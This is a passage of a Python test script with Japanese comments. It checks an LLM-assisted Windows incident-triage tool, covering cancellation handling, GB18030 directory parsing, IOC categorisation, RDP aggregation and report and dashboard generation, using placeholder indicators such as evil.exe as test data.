section("ケース V: 解析中断機能（cancel_check）")
# 実運用要望: 実行中の解析を途中で中断できるようにしたい。
# analyze() に cancel_check を渡し、True を返すようになった時点で
# 未着手のセクションはLLM呼び出しをせずスキップされることを検証する。
# 「呼ばれたら即座に例外を投げるダミークライアント」を使い、
# キャンセルされたセクションでは実際にLLMが一切呼ばれないことを証明する。

class _PoisonClient:
    """呼び出されたら即座に失敗する（＝呼ばれてはいけないことの証明用）"""
    class chat:
        class completions:
            @staticmethod
            def create(*a, **kw):
                raise AssertionError("中断済みのはずのセクションでLLMが呼ばれた")

# Level1フィルタ/異常スコアで弾かれず実際にLLM呼び出しへ到達するデータ
# （二重拡張子は高スコアになりLLM送付対象になることをケースTで確認済み）
_v_parsed = {
    "meta": {"hostname": "TESTHOST"},
    "sections": {"directory": [
        {"path": r"C:\Users\Public\Libraries\invoice.pdf.exe",
         "date": "2026/01/01  00:00", "size": "1000"}
    ]},
    "event_logs": {},
}

import io, contextlib
_stderr_buf = io.StringIO()
with contextlib.redirect_stderr(_stderr_buf):
    _v_result = _as.analyze(
        _v_parsed, depth=1, client=_PoisonClient, model="dummy",
        target_sections=["directory"], cancel_check=lambda: True,
    )
check("V-1: cancel_check=True → 対象セクションはcancelled=Trueで返る",
      _v_result["sections"]["directory"].get("cancelled") is True,
      f"result={_v_result['sections']['directory']}")
check("V-2: cancel_check=True → LLMは一切呼ばれない（PoisonClientのエラーがstderrに出ていない）",
      "LLMが呼ばれた" not in _stderr_buf.getvalue(), f"stderr={_stderr_buf.getvalue()}")

_stderr_buf2 = io.StringIO()
with contextlib.redirect_stderr(_stderr_buf2):
    _v_result2 = _as.analyze(
        _v_parsed, depth=1, client=_PoisonClient, model="dummy",
        target_sections=["directory"], cancel_check=None,
    )
check("V-3: cancel_check未指定時はcancelledフラグが立たない（従来通り処理が進む）",
      not _v_result2["sections"]["directory"].get("cancelled"),
      f"result={_v_result2['sections']['directory']}")
check("V-4: cancel_check未指定時は実際にLLM呼び出しへ到達する"
      "（PoisonClientのエラーがstderrに記録される＝呼ばれたことの証明）",
      "LLMが呼ばれた" in _stderr_buf2.getvalue(), f"stderr={_stderr_buf2.getvalue()}")

# ═══════════════════════════════════════════════════════════════
# ケース X: 簡体字中国語ロケール(GB18030)のdirectory解析
# ═══════════════════════════════════════════════════════════════
section("ケース X: 簡体字中国語ロケール(GB18030)のdirectory解析")
# 実運用で発覚: 簡体字中国語ロケールのWindowsホスト（dirコマンド出力が
# GBK/GB18030）で、read_file()の候補にgb18030が無くcp932に誤判定され、
# "的目录"マーカーが文字化けしてdirectory解析結果が常に0件になっていた
# （実データ HOST-REF-03 で 0件→1,843,286件に改善したことを確認済み）。
# 実ファイルの代わりに、同じ構造を持つ小さなGB18030バイト列で
# 軽量に再現・検証する。
_w_text_unicode = (
    "15. Check Directory\n"
    "--------------------------------------------------------------------------------\n"
    'dir /a /r "C:\\Windows\\addins" \n'
    " 驱动器 C 中的卷没有标签。\n"
    " 卷的序列号是 A779-9F02\n"
    "\n"
    " C:\\Windows\\addins 的目录\n"
    "\n"
    "2024/12/04  16:55    <DIR>          .\n"
    "2026/07/01  14:59    <DIR>          ..\n"
    "2024/12/04  16:55               802 FXSEXT.ecf\n"
    "               1 个文件            802 字节\n"
)
_w_gb18030_bytes = _w_text_unicode.encode("gb18030")

with tempfile.NamedTemporaryFile(mode="wb", suffix=".txt", delete=False) as _wf:
    _wf.write(_w_gb18030_bytes)
    _w_path = _wf.name
try:
    _w_read = read_file(_w_path)
    check("X-1: read_file()がGB18030バイト列を文字化けさせず正しく読み込める"
          "（'的目录'マーカーが復元される）",
          "的目录" in _w_read, f"read結果冒頭200文字={_w_read[:200]!r}")

    _w_dir_section = _w_read  # このテストデータ自体が directory セクション相当
    _w_entries = parse_directory(_w_dir_section)
    check("X-2: GB18030由来のdirectoryセクションから実際にエントリが抽出される"
          "（修正前は current_dir が設定されず常に0件だった）",
          len(_w_entries) == 1 and _w_entries[0]["name"] == "FXSEXT.ecf",
          f"entries={_w_entries}")
finally:
    os.unlink(_w_path)

# ═══════════════════════════════════════════════════════════════
# ケース BB: LLM呼び出しのstopシーケンスから"```"が除去されている
# ═══════════════════════════════════════════════════════════════
section("ケース BB: LLM呼び出しのstopシーケンスから\"```\"が除去されている")
# 実運用で発覚: stop=[...,"```"] が指定されていたため、Qwen2.5-Coderが
# 応答を```jsonのコードフェンスで書き始めた場合、生成開始直後にstopが
# ヒットして応答が完全に空文字列になり、correlate.py側で
# infection_suspicionがLLMから正常に返せず決定論フォールバックが
# 発動する事象が複数ホストで発生していた（parse_error=True,
# raw_response=""として記録されていたことで発覚）。
# extract_first_json_objectはコードフェンス付き応答からも問題なく
# 抽出できるため、"```"をstopに含める必要はなく、除去した。

class _StopCaptureCompletions:
    def __init__(self):
        self.captured_stop = None
    def create(self, *a, **kw):
        self.captured_stop = kw.get("stop")
        class _Msg:
            content = '{"infection_suspicion": "LOW", "correlated_iocs": []}'
        class _Choice:
            message = _Msg()
        class _Resp:
            choices = [_Choice()]
        return _Resp()

class _StopCaptureClient:
    def __init__(self):
        self.completions_obj = _StopCaptureCompletions()
        self.chat = type("C", (), {"completions": self.completions_obj})()

_bb_client = _StopCaptureClient()
_bb_analyzed = {
    "meta": {"hostname": "TESTHOST"},
    "sections": {"known_tools": {"entries": [
        {"score": "HIGH", "identifier": "evil.exe", "reason": "test", "iocs": []}
    ], "section_summary": ""}},
}
import correlate as _correlate_mod
_correlate_mod.correlate(_bb_analyzed, depth=2, client=_bb_client, model="dummy-model")
_bb_stop = _bb_client.completions_obj.captured_stop
check("correlate.py: stopシーケンスを送信しない",
      _bb_stop is None, f"captured_stop={_bb_stop}")
check("correlate.py: 証拠文字列による意図しない切断を避ける",
      _bb_stop is None, f"captured_stop={_bb_stop}")

_bb_client2 = _StopCaptureClient()
_as.call_llm(_bb_client2, "dummy-model", "task_scheduler", depth=2,
             data_text="test_identifier: evil.exe")
_bb_stop2 = _bb_client2.completions_obj.captured_stop
check("analyze_section.py: stopシーケンスを送信しない",
      _bb_stop2 is None, f"captured_stop={_bb_stop2}")

# ═══════════════════════════════════════════════════════════════
# ケース CC: 推定タイムラインをレポート本体から分離（可視性改善）
# ═══════════════════════════════════════════════════════════════
section("ケース CC: 推定タイムラインをレポート本体から分離")
# 実運用フィードバック: LLMによる「推定タイムライン」は情報が雑になる
# ケースが多く可読性を損なうため、レポート本体には含めず、決定論的な
# timeline.py出力（別ファイル）への参照のみ示すよう変更した。
_cc_analyzed = {"meta": {"hostname": "TESTHOST", "datestamp": "20260101000000"},
                "sections": {}}
_cc_correlation = {
    "infection_suspicion": "LOW", "malware_family": "Unknown",
    "infection_summary": "テスト", "correlated_iocs": [],
    "timeline": [{"datetime": "2026-01-01", "event": "テストイベント", "evidence": "test"}],
    "mitre_ttps": [], "recommended_actions": [],
}
_cc_report = generate_report(_cc_analyzed, _cc_correlation, full=False)
check("CC-1: 旧形式の「## 推定タイムライン」見出しはレポートに出ない",
      "## 推定タイムライン" not in _cc_report, f"report抜粋={_cc_report[:3000]}")
check("CC-2: タイムラインの表形式（日時|イベント|根拠のヘッダ）はレポートに出ない",
      "| 日時 | イベント | 根拠 |" not in _cc_report)
check("CC-3: 代わりに別ファイル参照の案内が出る",
      "_timeline.md" in _cc_report and "本レポートには含まれません" in _cc_report,
      f"report抜粋={_cc_report[:3000]}")
check("CC-4: 案内文に実際のhostname/datestampが正しく埋め込まれる（プレースホルダのままではない）",
      "report_TESTHOST_20260101000000_timeline.md" in _cc_report,
      f"report抜粋={_cc_report[:3000]}")

# ═══════════════════════════════════════════════════════════════
# ケース DD: 所見なしセクションの折りたたみ表示（レポート可視性改善）
# ═══════════════════════════════════════════════════════════════
section("ケース DD: 所見なしセクションの折りたたみ表示")
# 実運用要望: セクション数が多いホストで「エントリなし」が延々と並び
# 冗長になるため、所見が全く無いセクションは<details><summary>で
# 折りたたみ表示にした（GUI側のmarkdownToHtmlが安全にパススルーする）。

# ① summaryもエントリも一切無い（完全に空）場合は従来通り出力自体が空文字列
_dd_empty = section_entries_md("service", {"entries": [], "section_summary": ""}, full=False)
check("DD-1: summary・エントリともに無い場合は空文字列のまま（従来通り、折りたたみ表示すら不要）",
      _dd_empty == "", f"result={_dd_empty!r}")

# ② summaryはあるがHIGH/MEDIUM/LOWエントリが無い場合は折りたたみ表示になる
_dd_summary_only = section_entries_md(
    "service", {"entries": [], "section_summary": "Level 1 フィルタに該当するエントリなし"}, full=False)
check("DD-2: summaryありエントリなしの場合は<details>で折りたたまれる",
      _dd_summary_only.startswith('<details class="sec-empty"><summary>'),
      f"result={_dd_summary_only!r}")
check("DD-3: <summary>にセクション名と「所見なし」が入る",
      "サービス（所見なし）</summary>" in _dd_summary_only, f"result={_dd_summary_only!r}")
check("DD-4: 折りたたみ内部にsummaryテキストが保持される",
      "Level 1 フィルタに該当するエントリなし" in _dd_summary_only, f"result={_dd_summary_only!r}")
check("DD-5: <details>は正しく</details>で閉じられる",
      _dd_summary_only.rstrip().endswith("</details>"), f"result={_dd_summary_only!r}")

# ③ HIGH/MEDIUM/LOWのいずれかがあれば従来通り折りたたまれない（通常表示）
_dd_with_high = section_entries_md("service", {"entries": [
    {"score": "HIGH", "identifier": "evil.exe", "reason": "test", "iocs": []}
], "section_summary": ""}, full=False)
check("DD-6: HIGHエントリがある場合は折りたたまれず通常表示される",
      "<details" not in _dd_with_high and "### サービス" in _dd_with_high,
      f"result={_dd_with_high!r}")

# ═══════════════════════════════════════════════════════════════
# ケース Y: rdp_inbound の同一IP集約（レポート可視性改善）
# ═══════════════════════════════════════════════════════════════
section("ケース Y: rdp_inbound の同一IP集約")
# 実運用要望: VM管理基盤ホスト等で同一IPからの着信RDPが数百件記録され、
# HIGHスコアのエントリが常に個別展開されるため（M-1のMEDIUM集約対象外）
# レポートが著しく読みにくくなっていた。同一IPをスコアに関係なく
# 集約する機能を追加した。
_y_entries = []
for i in range(5):
    _y_entries.append({
        "identifier": f"EID 21 着信RDP 2026-01-0{i+1}T10:00:00.000 接続元=192.168.1.100 ユーザー=CORP\\admin",
        "score": "LOW", "reason": "内部IP 192.168.1.100 からの着信RDP。業務上の横移動の可能性。",
        "iocs": ["192.168.1.100"], "mitre": ["T1021.001"],
    })
for i in range(4):
    _y_entries.append({
        "identifier": f"EID 21 着信RDP 2026-02-0{i+1}T11:00:00.000 接続元=1.2.3.4 ユーザー=CORP\\svc",
        "score": "HIGH", "reason": "外部IP 1.2.3.4 からの着信RDPログオン。",
        "iocs": ["1.2.3.4"], "mitre": ["T1021.001"],
    })
# 閾値未満(2件)のIPは個別展開されるはず
_y_entries.append({
    "identifier": "EID 21 着信RDP 2026-03-01T09:00:00.000 接続元=8.8.8.8 ユーザー=CORP\\test",
    "score": "LOW", "reason": "内部IP 8.8.8.8 からの着信RDP。", "iocs": ["8.8.8.8"], "mitre": [],
})
_y_sec = {"entries": _y_entries, "section_summary": "テスト用サマリ"}
_y_md = section_entries_md("rdp_inbound", _y_sec, full=False)

check("Y-1: 5件のIP(192.168.1.100)が1行に集約される",
      "192.168.1.100 からの着信RDP 5件" in _y_md, f"md={_y_md}")
check("Y-2: 4件の外部IP(1.2.3.4, HIGH)も集約される（HIGHでも集約対象）",
      "1.2.3.4 からの着信RDP 4件" in _y_md and "🔴" in _y_md, f"md={_y_md}")
check("Y-3: 閾値未満(1件)のIP(8.8.8.8)はRDP集約(3件以上のグループ化)の対象外"
      "（既存のLOW件数サマリ機構側で処理されるため、RDP集約行には現れない）",
      "8.8.8.8 からの着信RDP" not in _y_md, f"md={_y_md}")
check("Y-4: 集約後の総件数(*↑ 同一IPからの着信RDP...)が正しい(5+4=9件、8.8.8.8は個別展開のため含まない)",
      "同一IPからの着信RDP 9件をIPごとに集約" in _y_md, f"md={_y_md}")

# full=True（_all版）では集約されず、従来通り全件展開されることを確認
_y_md_full = section_entries_md("rdp_inbound", _y_sec, full=True)
check("Y-5: full=True（_all版）ではRDP集約が行われず全件展開される",
      "（集約）" not in _y_md_full, f"md_full={_y_md_full[:300]}")

# ═══════════════════════════════════════════════════════════════
# ケース Z: IOCカテゴリ分類・既知インフラサービス注記（レポート可視性改善）
# ═══════════════════════════════════════════════════════════════
section("ケース Z: IOCカテゴリ分類・既知インフラサービス注記")

check("Z-1: identify_known_service はAzureプラットフォームIPを識別する",
      "Azure" in identify_known_service("168.63.129.16:32526"))
check("Z-2: identify_known_service は無関係なIPには空文字列を返す",
      identify_known_service("1.2.3.4") == "")
check("Z-3: identify_known_service はIPを含まない文字列には空文字列を返す",
      identify_known_service("該当なし") == "")

_z_result = {
    "correlated_iocs": [
        {"ioc": "168.63.129.16", "significance": "非標準ポートへの接続"},
        {"ioc": "192.168.1.5", "significance": "内部IPからのアクセス"},
        {"ioc": "C:\\evil\\malware.exe", "significance": "マルウェアと断定、C2通信の痕跡"},
        {"ioc": "C:\\Program Files\\Vendor\\Tool\\update.ps1",
         "significance": "監視エージェントの証明書更新スクリプト"},
        {"ioc": "1.2.3.4", "significance": "不明な接続"},
        {"ioc": "既に分類済み", "significance": "テスト", "category": "external_intrusion"},
    ]
}
n_cat = _apply_ioc_category_fallback(_z_result)
n_svc = _annotate_known_infra_services(_z_result)
cats = [i.get("category") for i in _z_result["correlated_iocs"]]
check("Z-4: 既知インフラIP(168.63.129.16)はinternal_automationに分類される",
      cats[0] == "internal_automation", f"cats={cats}")
check("Z-5: プライベートIP(192.168.1.5)は根拠不足ならinternal_unclear",
      cats[1] == "internal_unclear", f"cats={cats}")
check("Z-6: マルウェア/C2キーワードを含むIOCはexternal_intrusionに分類される",
      cats[2] == "external_intrusion", f"cats={cats}")
check("Z-7: 監視エージェント関連キーワードを含むIOCはinternal_automationに分類される",
      cats[3] == "internal_automation", f"cats={cats}")
check("Z-8: どの条件にも一致しないIOCはunclearに分類される",
      cats[4] == "unclear", f"cats={cats}")
check("Z-9: 既にcategoryが設定済みのIOCは上書きされない",
      cats[5] == "external_intrusion", f"cats={cats}")
check("Z-10: 補完件数は5件（既に設定済みの1件を除く6件中5件）", n_cat == 5, f"n_cat={n_cat}")
check("Z-11: known_serviceはAzure該当の1件のみ注記される", n_svc == 1, f"n_svc={n_svc}")
check("Z-12: known_serviceの内容がAzureを含む",
      "Azure" in _z_result["correlated_iocs"][0].get("known_service", ""))

# report_gen.py側: カテゴリ別グルーピング表示を確認
_z_correlation = {
    "infection_suspicion": "MEDIUM", "malware_family": "Unknown",
    "infection_summary": "テスト", "correlated_iocs": _z_result["correlated_iocs"],
    "timeline": [], "mitre_ttps": [], "recommended_actions": [],
}
_z_analyzed = {"meta": {"hostname": "TESTHOST"}, "sections": {}}
_z_report_md = generate_report(_z_analyzed, _z_correlation, full=False)
check("Z-13: レポートに外部侵入セクションの見出しが出る",
      "🔴 外部侵入の兆候" in _z_report_md, f"report抜粋={_z_report_md[:2000]}")
check("Z-14: レポートに内部の自動化ツールセクションの見出しが出る",
      "🔵 内部の設定変更・自動化ツール" in _z_report_md)
check("Z-15: レポートに不明・要確認セクションの見出しが出る",
      "⚪ 不明・要確認" in _z_report_md)
check("Z-16: known_serviceの注記(Azure)がレポート本文に反映される",
      "Azure" in _z_report_md)

# ═══════════════════════════════════════════════════════════════
# ケース AA: バッチ横断サマリダッシュボード（レポート可視性改善）
# ═══════════════════════════════════════════════════════════════
section("ケース AA: バッチ横断サマリダッシュボード")

with tempfile.TemporaryDirectory() as _aa_root:
    _aa_root = Path(_aa_root)

    def _make_host(name, suspicion, family, sections):
        d = _aa_root / name
        d.mkdir()
        (d / f"correlation_{name}_vt.json").write_text(json.dumps({
            "meta": {"hostname": name},
            "infection_suspicion": suspicion, "malware_family": family,
            "infection_summary": f"{name}のサマリ",
        }, ensure_ascii=False), encoding="utf-8")
        (d / f"analyzed_{name}_vt.json").write_text(json.dumps({
            "meta": {"hostname": name}, "sections": sections,
        }, ensure_ascii=False), encoding="utf-8")
        return d

    _aa_dir1 = _make_host("HOSTA", "HIGH", "TestMal", {
        "known_tools": {"entries": [
            {"score": "HIGH", "identifier": "evil.exe", "iocs": ["C:\\shared\\evil.exe"]},
            {"score": "MEDIUM", "identifier": "onlyA.exe", "iocs": ["C:\\onlyA.exe"]},
        ]},
    })
    _aa_dir2 = _make_host("HOSTB", "MEDIUM", "Unknown", {
        "known_tools": {"entries": [
            {"score": "HIGH", "identifier": "evil.exe", "iocs": ["C:\\shared\\evil.exe"]},
        ]},
        "netstat": {"entries": [
            {"score": "MEDIUM", "identifier": "168.63.129.16:443", "iocs": ["168.63.129.16"]},
        ]},
    })
    _aa_dir3 = _make_host("HOSTC", "LOW", "Unknown", {
        "netstat": {"entries": [
            {"score": "MEDIUM", "identifier": "168.63.129.16:443", "iocs": ["168.63.129.16"]},
        ]},
    })

    _aa_summaries = [collect_host_summary(d) for d in (_aa_dir1, _aa_dir2, _aa_dir3)]
    check("AA-1: 各ホストのhostname/感染嫌疑/マルウェアファミリが正しく取得される",
          {s["hostname"]: s["infection_suspicion"] for s in _aa_summaries} ==
          {"HOSTA": "HIGH", "HOSTB": "MEDIUM", "HOSTC": "LOW"},
          f"summaries={_aa_summaries}")
    check("AA-2: HIGH/MEDIUM件数が正しく集計される（HOSTAはHIGH1件+MEDIUM1件）",
          _aa_summaries[0]["high_count"] == 1 and _aa_summaries[0]["medium_count"] == 1,
          f"summary={_aa_summaries[0]}")

    _aa_cross = find_cross_host_iocs(_aa_summaries, min_hosts=2)
    _aa_values = {c["value"]: c for c in _aa_cross}
    check("AA-3: 2ホスト共通のIOC(C:\\shared\\evil.exe)が横断相関として検出される",
          "C:\\shared\\evil.exe" in _aa_values, f"cross={_aa_cross}")
    check("AA-4: 該当ホストがHOSTA/HOSTBの2件であることが分かる",
          sorted(_aa_values.get("C:\\shared\\evil.exe", {}).get("hosts", [])) == ["HOSTA", "HOSTB"])
    check("AA-5: 1ホストのみのIOC(onlyA.exe)は横断相関に含まれない（min_hosts=2未満）",
          "C:\\onlyA.exe" not in _aa_values, f"cross={_aa_cross}")
    check("AA-6: 既知インフラIP(168.63.129.16)にAzureの注記が付く",
          "Azure" in _aa_values.get("168.63.129.16", {}).get("known_service", ""),
          f"cross={_aa_cross}")

    _aa_md = generate_dashboard_md(_aa_summaries, _aa_cross)
    check("AA-7: ダッシュボードMarkdownに全ホストの行が含まれる",
          all(name in _aa_md for name in ("HOSTA", "HOSTB", "HOSTC")))
    check("AA-8: ダッシュボードに横断IOCセクションが含まれる",
          "複数ホストで共通するIOC" in _aa_md and "C:\\shared\\evil.exe" in _aa_md)
    check("AA-9: HIGH/MEDIUM/LOW以下の集計件数が正しい(HIGH1/MEDIUM1/LOW以下1)",
          "HIGH: 1 / MEDIUM: 1 / LOW以下: 1" in _aa_md, f"md抜粋={_aa_md[:200]}")

# ═══════════════════════════════════════════════════════════════
# 結果サマリ
# ═══════════════════════════════════════════════════════════════
print(f"\n{'═'*60}")
print(f"  テスト結果: PASS={PASS}  FAIL={FAIL}  合計={PASS+FAIL}")
print(f"{'═'*60}")
sys.exit(0 if FAIL == 0 else 1)
